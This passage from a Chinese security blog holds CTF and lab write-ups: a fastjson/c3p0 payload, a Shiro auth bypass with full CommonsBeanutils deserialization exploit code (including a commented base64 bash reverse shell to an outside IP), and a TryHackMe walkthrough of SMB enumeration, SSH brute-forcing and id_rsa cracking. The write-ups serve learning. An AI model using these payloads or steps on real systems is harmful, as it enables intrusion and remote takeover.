class_">PropertysetItem</span>();</span><br><span class="line"></span><br><span class="line">        NestedMethodProperty&lt;Object&gt; n = <span class="keyword">new</span> <span class="title class_">NestedMethodProperty</span>&lt;Object&gt;(myBean, <span class="string">&quot;Connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">        p.addItemProperty(<span class="string">&quot;Connection&quot;</span>, n);</span><br><span class="line"><span class="comment">//下面是为了用toString触发getPropertyId()方法</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;v&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, p);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        out.writeObject(badAttributeValueExpException);</span><br><span class="line">        out.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>[] hexChars = Hex.encodeHex(bytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(hexChars);</span><br><span class="line"><span class="comment">//这里是为了生成16进制编码的字节流</span></span><br><span class="line">        System.out.println(hexString.toUpperCase());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>然后把生成的hex字符串填在下面HexAsciiSerializedMap后面</p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;1&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&#125;,<span class="string">&quot;2&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,<span class="string">&quot;userOverridesAsString&quot;</span>:<span class="string">&quot;HexAsciiSerializedMap:替换这里;&quot;</span>,&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个payload在c3p0二次反序列化链子里给了</p><p><img src="../images/image-20230612150545126.png" alt="image-20230612150545126"></p><h2 id="MTCTF2022-easyjava"><a href="#MTCTF2022-easyjava" class="headerlink" title="MTCTF2022-easyjava"></a>MTCTF2022-easyjava</h2><p>考点:  <strong>shiro鉴权绕过、Java CB链</strong></p><p>题目就给了一个jar包</p><p>还是先看一下这个依赖</p><p><img src="../images/image-20230707163850027.png" alt="image-20230707163850027"></p><p>使用了<code>shiro</code>和这个<code>hibernate</code>   </p><p>这个shiro版本和550和721没啥大的关系</p><p>接下来看整体的结构部分</p><p><strong><code>HelloController.java</code>中</strong></p><p><img src="../images/image-20230707164251508.png" alt="image-20230707164251508"></p><p><img src="../images/image-20230707164448953.png" alt="image-20230707164448953"></p><p>这里是得想要先输入正确的账号密码获取token，才能进行反序列化利用</p><p><strong>ShiroConfig.java</strong>  中</p><p><img src="../images/image-20230707164855568.png" alt="image-20230707164855568"></p><p>shiro鉴权</p><p>但是我们并不知道账号密码</p><p>然后就去查一下shiro依赖是否存在漏洞    <a href="https://www.cnblogs.com/mt0u/p/16137193.html">Apache Shiro 漏洞汇总</a></p><p><img src="../images/image-20230707164630558.png" alt="image-20230707164630558"></p><p><img src="../images/image-20230707164922133.png" alt="image-20230707164922133"></p><p>成功进行绕过shiro鉴权</p><p><img src="../images/image-20230707165019352.png" alt="image-20230707165019352"></p><p><strong>这里的为什么用的是web呢？</strong></p><p><img src="../images/image-20230707165110562.png" alt="image-20230707165110562"></p><p>那么绕过鉴权之后  就可以进行反序列化漏洞利用了</p><p><strong>MyObjectInputStream.java中</strong></p><p><img src="../images/image-20230707165333649.png" alt="image-20230707165333649"></p><p>过滤了这几个类，但是在过滤第一个类的时候发生了错误少了一个<code>.</code></p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>  这样才对</p><p>然后我们就可以利用这个类来进行反序列化漏洞的利用</p><p><img src="../images/image-20230707170637882.png" alt="image-20230707170637882"></p><p><strong>这里的反序列化链子刚好可以用这个<code>cb</code>链来打</strong>       <strong>就是shiro自带的cb链子直接来打</strong></p><p>这个cc不行的原因是它是<code>3.2.2</code>版本    修复了<code>3.2.1</code>版本的漏洞</p><p><img src="../images/image-20230707201422422.png" alt="image-20230707201422422"></p><p>不允许使用<code>InvokerTransformer</code>  这个类了</p><p>所以说cc链就用不了</p><p>所以说就直接用cb链来打就行了</p><p><strong>evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuMjM1LjE3Ni84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>App.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        Base64Encode(barr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230707203445931.png" alt="image-20230707203445931"></p><p><strong>其实就是简单的shiro无依赖打cb链</strong>    （这里是因为出题人粗心了)</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p><strong>加个新的知识点</strong></p><p>基于 getter 方法触发 RCE，目前 Java 标准库里已经公开过的利用链有 <code>TemplatesImpl</code> 和 <code>JdbcRowSetImpl</code>：  下面就是新增加的一个</p><p>假如ban了<code>Tempatesimpl</code>我们可以使用别的类去触发JNDI注入</p><p>也就是<code>com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition</code></p><p><a href="https://mp.weixin.qq.com/s/ClASwg6SH0uij_-IX-GahQ">新的getter利用链 </a>   写的超级详细    java1.4和java8都可以用</p>]]></content>
      
      
      
        <tags>
            
            <tag> java-反序列化题目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thm-Basic Pentesting</title>
      <link href="/posts/4f9775c1.html"/>
      <url>/posts/4f9775c1.html</url>
      
        <content type="html"><![CDATA[<p>写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下</p><p>老样子还是先扫一下端口</p><p><img src="../images/image-20230521164057332.png" alt="image-20230521164057332"></p><p>扫出了这些端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">22</span><br><span class="line">80</span><br><span class="line">139</span><br><span class="line">445</span><br><span class="line">8009</span><br><span class="line">8080</span><br></pre></td></tr></table></figure><p>接下来访问80端口</p><p><img src="../images/image-20230521164222216.png" alt="image-20230521164222216"></p><p>没收集到啥有用的信息，扫个目录看看</p><p><img src="../images/image-20230521164453614.png" alt="image-20230521164453614"></p><p>发现一个development目录  于是进行访问</p><p><img src="../images/image-20230521164535782.png" alt="image-20230521164535782"></p><p>发现两个文件</p><p>dev.txt</p><p><img src="../images/image-20230521164625273.png" alt="image-20230521164625273"></p><p>j.txt</p><p><img src="../images/image-20230521164734023.png" alt="image-20230521164734023"></p><p>所以我们在 dev 中打开这两个文本文件，我们可以看到消息是关于一些 apache struts 和 2.5.12 版本的，而 j.txt 文件是关于机器内部哈希密码的目录。所以现在让我们考虑一下 Apache struts 2.5.12 版本，我们用 google 搜索了 Apache struts 2.15.12 以找到一些漏洞，我们得到了一个可以利用的 Metasploit 模块，但在尝试之后并没有给我一个连接。</p><p>我们无法从 Metasploit 模块获得反向 shell</p><p>现在让我们回到 Nmap 脚本，结果显示我们打开了 SMB 端口，我们也有 SMB 版本如果 SMB 版本存在漏洞，让我们谷歌一下</p><p>经过一些研究，我们得到了 <strong>Enum4linux—— <em>Enum4linux</em></strong>是一个用于从 Windows 和 <strong>Samba</strong> 系统枚举信息的工具。</p><p>所以现在我们可以运行命令“Enum4linux -a ipaddress”</p><p><img src="../images/image-20230521165356870.png" alt="image-20230521165356870"></p><p>成功找到这两个用户名，这里还有一种方法就是尝试一一下<strong>smb匿名用户登录</strong></p><p><code>smbclient //10.10.245.61/anonymous</code></p><p><img src="../images/image-20230521165706991.png" alt="image-20230521165706991"></p><p>直接匿名登录成功了</p><p><img src="../images/image-20230521165802097.png" alt="image-20230521165802097"></p><p>这也可以成功拿到名字，接下来就是尝试爆破ssh密码了</p><p>使用的是<code>hydra</code>工具  也叫九头蛇</p><p><img src="../images/image-20230521170726504.png" alt="image-20230521170726504"></p><p>使用这个工具，然后爆破出 <code>jan</code>的密码为<code>armando</code></p><p>于是进行登录</p><p><img src="../images/image-20230521170849656.png" alt="image-20230521170849656"></p><p>成功进行登录</p><p><img src="../images/image-20230521171014069.png" alt="image-20230521171014069"></p><p>发现jan用户没有权限查看kay用户目录下的文件，于是我们就尝试收集一些信息来尝试登录kay用户</p><p><img src="../images/image-20230521171101435.png" alt="image-20230521171101435"></p><p>发现存在<code>.ssh</code>文件</p><p>ssh进行免密登录的要求是<strong>私钥</strong>(<code>id_rsa</code>)要在客户段，<strong>公钥</strong>(<code>id_rsa.pub</code>)在服务端</p><p>在谷歌上搜索后我们知道这个 SSH 密钥可以用 John the ripper 破解。因此，让我们尝试破解 SSH 密钥。</p><p>所以首先我们必须找到 ssh2john.py 来转换哈希并将“id_rsa”文件内容作为文本文件复制并保存到我们的计算机，我们必须将文本文件转换为哈希格式你可以使用如图所示的命令在下图中</p><p><img src="../images/image-20230521172330697.png" alt="image-20230521172330697"></p><p>直接使用.ssh里的id_rsa是登不上去的，得需要john进行破解密码</p><p><img src="../images/image-20230521173041417.png" alt="image-20230521173041417"></p><p>这里是因为使用id_rsa受到密码保护，得输入密码才能使用，所以这里就得需要john进行密码的破解</p><p><strong>john的用法就是把需要破解的东西先转为它能识别的样子，然后在进行破解</strong></p><p>最后爆破出来的密码是<code>beeswax</code></p><p><img src="../images/image-20230521173425039.png" alt="image-20230521173425039"></p><p>成功进行登录</p><p><img src="../images/image-20230521173631270.png" alt="image-20230521173631270"></p><p>然后使用sudo -l来进行查看，发现kay用户可以访问所有的sudo命令</p><p><code>sudo su</code>进行提权</p><p><img src="../images/image-20230521173743387.png" alt="image-20230521173743387"></p><p><strong>总结</strong></p><p><strong>这里的学习到了遇到smb协议的时候该怎么办</strong></p><p><strong>还有使用john来破解id_rsa的使用密码</strong></p><p><strong>感觉john是不是啥密码都能进行爆破</strong> </p>]]></content>
      
      
      
        <tags>
            
            <tag> thm-Basic Pentesting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-代码执行</title>
      <link href="/posts/2e4c90e3.html"/>
      <url>/posts/2e4c90e3.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="afd8626805df0a076cc1561e36377044514cd3054efa72ff9b16cd6df3a825e4">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a411a4dce0576ca6954eba4da492de19556ccfbf8c6a490a36646c6b679f0a571674c1ae66cf5f4f4f76cc2548b90048457eb120e87505a7de97e5aa22101535ae33e87841b264c96c733f07e217dcbdf83a4019d501fc95cfa26f660dbce2f3ea3417c0fa812ead3aabad118fd46e05cf233be8b75092f68567d6147f3fe15f987ad5a92713f7ffeb85d555c670394aa405ecce6e20221eb344aa97818491f193a11e8b3115d6ea673bdc46a635dbd17e24944f748cbd4e0ec33e6e9194a721c04739fd08b059de28ee3a2d69d5cb1f8f4c1d29184d75f70a4b6c23de6cdcdc4ed73f72b940e9b46878dc3e155dad742a1d48caab05450d96472568c317abd6df589ef8f898e6adc49148eb9a3bfc371f2420c69e5d07bdbf181a4ba399c118ab7076a086176d7292c5c35d5da4c357687739adfc5469a01477211f3b435f6bc1590e4dad53f8fcf264979adf63af6451b218f4fbffcad11d1d67537e0c288d467d5298d6a3dbd6d8657cb8fd4ad7e47427279f1fe2f32b88440ceb8df981d5cd3309d61116f7d2b8eb0000cf42488b8607f9bee1a1059a8807f92633a4d950c138cf01f8b5702877127c542f8fc16b2ff53b03ec23ff1347198017fd26c5104c9f2b41e2444ab14687b511667317442f17e615a9cfe63b7230eb76189e24bbdc21876cc303d3993476c05cce4a5a43e8e65d2cf9c17d60a5f628988d2a665ae4d5c5a56f31931da8063e06a7a7d9138be59fb81db6ed67c6bea10c2c0b51ec8de732037fd8fef1874f332ff7ac0d760cc1cb1f79175c1adfcd40c9a3aa6f84bca88e092a47ee69cec5a62e2308e4f9d4b8489dd56ec02eeef8a930548ce240fa6889a1bd1c5ce7e5fc9093eb8ad2b36a1232bc7ba21de8b24ae47e0ce3de902d12ad282a8d002fe0f199b2a939fedad480b452719bef272a7fcde2ec031ab4373be3f2b6a2ea327ea22ab950dc77fba6fd70170b4782c0eb2b2ff7c388b730778fbf276ec53119fd9ec0ed0fe3061ce503e5a69952439fa05b04e8699f1ce9621e1eaa51939a499e9230f0253b295eae9038ca3000e00d856d0ba72d1b02c2ddb28119c60dcd2374f8b5b9bdbe8e5c982e015a0315f28f45485a16eb1459bc47603279b4f5488cd7b299d720a41d9ca4b51abca9228a2ef6161b5323faa6fa010a19eb2e645f86901955109bbeba18566bfddac229747f1b09fd37ee203eed6f6ae9a2b1f002c0c267f4be642eb4e293e83119eba7b03a3c075b598f830cfecc3194d443c47b6db7803c8f1d61aad49e33c80f897d85b55971ecbda163188be96440734e5589234a5dedcb95d15f4b77262ee0fe94530250f7e45ee66eef15a2e7cf7b1fd75362b0a0f54a83e6c92c196c39d92c909ab92b3a55729f853b91644c606fb83e9c6f645898f2e0852d74bb300bd69e58d7d287ec0d99e4078394d3d99924448ca1045755e69d62cfdfb46a643193ef84a5999ead6265556a1ff551e1483981e3c6c947d9bac94ab8f2e378b23bea741175923143d3700154a72dece51e85b438408b4883f1fbcd28c9264d3a03f32ce05dab3701e75fe88f8a7181e25f2a481fa5e788b01c771c4f4010aa295e8856087469174aa3338eb7bcef990becfd2084b7025cdf6f2503c9d4ccd820f7591ad68802f820a9b1ce3d7da9bd3def5bd900bfd3b6af48451e5dc032af69a474e356ff1f3f6b753e28259d853a008d42256751e5e1e56f1d746cb8855602050bdbeda7f44b835f93de3cf3bbe8a65ca236ccca45fa67c81bc62b6eefaab2e4cade0ab9c99f8f73ecd61cf04bbdea4fa5fdd9451f20578dd64bf328e9ec641b8ced4759c9413b4ad288e6d820d9e3034d85e0178ef61c510a398b7cd10ba44b268d743201ce542a4ba74c993512df47719aa67939a013c3e9bbb5569bf2e75bcf166143e16e7335568608f116a2f5f85d1bbd3a24d460238816e1c8bac8bdf4ac424a8aad31f497215083f97f9544777904605d6a8ff76ddbb535dfa263560e2431eaf4c78518d905ea64173ef231fcfae72ab26f112ebef50a0002a05771f230c863cba3b6c89499ce586348f7a5daa1f64adac0d55319f671863bdb3e9e0dafa653742f16b35413963290fe0eae627c0ccaa25d6b34a837de43945fc0f7613526e2ba382b9ad41b8736278b002f9d03ea028bdc9277b4839938543ee3e3bda42fa6f7de7108a5cedff4ae6a942c9c2b3c4eb18237e7d46588ea38c19a1437b37500e376eb1932e268f39a9a225be3ec7455993ddcdc1fbbe9fdc2b2d93578997e23d4b716f0b5ec27ccac9aae87c6b7a08e3d0e6eec37f7f2bc582966b170b8fa8063c223cbac269707c6711295e2b12069c9deef79350689e70ce94e936a6dba8581c74bccba24324ecac8054e47964bd64c21073360892ee2f9d6d0eb63b314965a78aa6cfd2a2328391079bfacf14566f7f66c02211c8dd6aae84a516b000fe23fad18f44828591090dc4470fc6b8d0e2b245a0a3513bdfbff7e54c6fe7be396c38c6f1b84f0758318ca12c69a7a3659bab785fa6d18f6eb1cf67d44b0c69a90f3608e23fac866922518d96284e9ec465c1640f9dcae60a57a54800a99c370e512a21c5362326874717e7097ea2f771c4279206f3822bcd330a50cb16a225de1512790baf6e3ad4b98c91d4c8bd3aaf8f44ba84453eed1c7efee23605770aee881a667ff7efaeef179c4949abe083c25e7d6246c176bb8a733310fa57ee5e43073f2a4ffc4717aa0b4552dd74e2a0fc8bf5947b18716fe383490e2f78e795638be404c115508c02dc9ef5870771665213e7df7504bc9f60fb14df0b986975085d21442002c2b7df9f0efabec2422e0a2d2b9497409addb0d8f6135da697cf66effd4a6658f03d4ea4cbde9074494d729d4da363187d597759c34f5d7a5b08b1582ad5640ed8b402f7d6f21be2e6abac1603bc63f499e5b0ba67586e2682863852a8ed189281b422960a164a52bd5bfd0125c7af42e37566bb931825cee3f5240415811b1f498694fb3d15a33c48acd0882c50d8564a5f7230cb79adbbdfae4ef4258aa7c1ccc0fdba846631834677f1bd659122eb949ef2a3c317ac65c1a487489dc5530033a3b2d3352ddf46faab4152e3e03201ed0df1488a63d11dac86326d327631dd66c1e65f45bb918c39ba665d22f90afab91dd5893f4b7ca8e8268106b59c599b41d5aa0e1166125249c2496ea07bb0edc0daf88728be7f409f7d95399cc9a0559f1edf51fa90b7175a406773890a9f5007bd1c3ef5d22acac240d2f5da18753d044121bb3f4ffb035cbd3af6d04826a78624a08dc0927d55f10d9402833a20f07c2f51f264d44c6554af57a2b37fead41bc70eb2f5efa8f5c1c2ee144307eae7cf296c4fdab9555dc9395d8d197eb618f7098d528e681cc0b827ff58138229e95e7f3e446b6e255d7636b5a9c7c28f85339e80d4f4769a294c7091cfe772214267060aa1c8aa40e337c6f609ccb89eb95c90d8aefe6fb21844084d1cfb645d9e5b620f0acd8b682938ace2862bbf5ec6dbd715f91cf7a9631f47c69f767f85e21d088e1d166cc73666fd57b03e117e68438ece000580f905fd3e0bc6feefac1a696e6a5efea0af69e434aab38ea797e396801e74e0cf4ec78c9a8dbf993dca0825e703b0bb01244a67ce2001ea6675f1f6e30b723b8bc96f8e7844fc737dfa211ff4ea7d0c07bdf568ad71e39cbcf4830aa9419605a77308078a1284662da20d98d648338ae9ed5d542c28c17f54a71a97fa6a8efd7d128f15c6f06edf7a78c4de08ef90b383d5024ad10bceeed9a7e915ed70d17e6ef9bb90adfe8e26d2d8565258fe1b1f6153b7d68d42b43a1b7b141b0e7c9d1a907edb45c0022e8b6e8fdfa1ccb96b8959a62c1e75c0204c069f84476991c8c7c49d5dd2709d235cdc5f6df59af4a0140f6ed74ecb7282a55e9f9f8bfec0963746c39db33705172136d8c7463c3c11ca1882d3000e14e0aa3b003b258f4100f2074c77de4cf127eb1dc9cf2b773ce5ed9145308ca26eda87476df07da15b757b65725ad9e8d8f799dded718612d8ae35eb4a5372c090df442af1908edc7fcdb8506273f8db95c74f413fc0b08de89f1271be70deeeb6a1a46d6d5a20e54d5ecd460f49236b2b4eea41766539b7e3b618561b5f5923fd9b8d679a3cd1da3f23975166e220fa1816fdadb7b14cccfcd1b7394c8e8d06194e2f4e8056c836525c311c5798005aa6a58c1cfbf8477808b8ea9c3821de2dff05b148270487dbd1dcdaad7baa5ba0c3b9cb1699331aefabe65b676007aa48e39f3bc9600e4d843254ead629c7862b14e8e0794d9ae546479d3344c13601f6a51a72e8f0b02486a798203df7581eb79430279aadeafa1ab9fd526734483cdac3eba256f9b937af582656b09e25b14a7c305e3f325b19299e70e3a4002bd9fd036c23963b6e434a3cebaac68da140a1c5ce6bfd0463c041996412ee30517819412ffae435e463e71a53dd359518e4e63fcac44916fdbc7ce8e23a33a23cb3890c63dbed370cfee019446450c489d7e8a4ab0c0db2488af38cd028b9ac0566b9047135f5405f6228a31ae3ea19c929fe1806826d93a6e7c30c5c41cc4976a07cc0eb6220ae851ed2a0fb4ecc913bdccac3318da0ed2dd839d8ab20d0a5d668108d8c46749ac89cbdcf62ef0c76adff2429ef32eabd4fd4e3272f53181e8d1c0fa104e03c62232912a0913397d58d87ee227bc026c00b8e92b